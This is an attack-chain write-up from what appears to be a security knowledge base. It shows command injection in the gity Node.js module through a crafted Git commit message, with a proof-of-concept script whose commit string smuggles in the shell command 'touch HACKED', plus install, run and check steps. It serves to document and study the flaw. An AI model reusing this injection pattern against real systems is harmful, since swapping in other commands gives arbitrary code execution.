---
tags:
  - rce
  - command-injection
  - node-js
  - git
type: attack_chain
tools:
  - '[[tools/npm]]'
  - '[[tools/Node-js]]'
  - '[[tools/gity]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Node.js
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-gity-RCE-with-Injected-Commands]]'
step_count: 4
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:23:19.745Z'
description: >-
  Demonstrates remote code execution in the gity Node.js module by injecting
  shell commands into a commit message, leading to arbitrary file creation and
  potential system compromise.
skill_level: intermediate
impact_level: high
id: 10b5b5e2-78c9-4bb0-922b-62993c34b9af
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# RCE in Node.js gity Module via Malicious Commit Message Injection

Multi-stage attack chain demonstrating exploitation of a command injection vulnerability in the gity module, allowing arbitrary shell command execution through a crafted Git commit message.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Prepare PoC] --> B[Verify Environment]
    B --> C[Install and Execute]
    C --> D[Confirm Exploitation]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/npm]]
- [[tools/Node-js]]
- [[tools/gity]]

### Target Environment

- Node.js runtime environment
- Git installed on the system
- Unix-like shell (e.g., Linux or macOS)

### Initial Access Requirements

- Local access to a Node.js development environment
- No network access required; exploitation occurs locally via module usage

## Detailed Attack Procedures

### Step 1: Create Proof of Concept Script
procedure: [[procedures/Exploit-gity-RCE-with-Injected-Commands]]

**Objective**: Develop a JavaScript script that uses the gity module to perform a Git commit with an injected shell command.

**Instructions**: Create a file named `poc.js` with the following content to initialize a Git repo, add files, and commit using a malicious message that injects `touch HACKED`:

```javascript
const gity = require('gity');
const git = gity();
git.init();
git.add('*.js');
git.commit('-m "added js files";touch HACKED;#');
git.run();
```

**Expected Output**: The script prepares for execution but does not run yet; no errors on syntax check.

**Success Indicators**:
- `poc.js` file created successfully
- Script loads gity module without issues

### Step 2: Verify No HACKED File Exists
procedure: [[procedures/Exploit-gity-RCE-with-Injected-Commands]]

**Objective**: Ensure the target filesystem is clean before exploitation to validate the injection's effect.

**Instructions**: Manually inspect the current directory using standard file listing commands like `ls` to confirm absence of `HACKED`.

```bash
ls -la | grep HACKED
```

**Expected Output**: No output or file not found.

**Success Indicators**:
- No `HACKED` file present in the directory

### Step 3: Install gity Module and Execute PoC
procedure: [[procedures/Exploit-gity-RCE-with-Injected-Commands]]

**Objective**: Install the vulnerable gity module and trigger the RCE by running the PoC script.

**Instructions**: First, install the module using [[commands/npm-install-gity]]:

```bash
npm i gity
```

Then execute the script with [[commands/node-execute-poc]]:

```bash
node poc.js
```

**Expected Output**: Git commands execute, commit message processes, and the injected `touch HACKED` runs silently; potential Git output showing commit success.

**Success Indicators**:
- gity@1.0.5 installed
- Script runs without runtime errors

### Step 4: Verify Exploitation Success
procedure: [[procedures/Exploit-gity-RCE-with-Injected-Commands]]

**Objective**: Confirm arbitrary command execution by checking for the created file.

**Instructions**: Re-inspect the directory using `ls` to locate the `HACKED` file created by the injected command.

```bash
ls -la | grep HACKED
```

**Expected Output**: `HACKED` file listed as an empty file (0 bytes).

**Success Indicators**:
- `HACKED` file exists post-execution
- File timestamp matches execution time

## Attack Chain Summary

### Key Achievements

1. Successful installation of vulnerable gity module
2. Injection of shell command via commit message leading to RCE
3. Creation of arbitrary file demonstrating command execution
4. Validation of full system compromise potential

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Unix Shell]]

### MITRE ATT&CK Tactics

- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
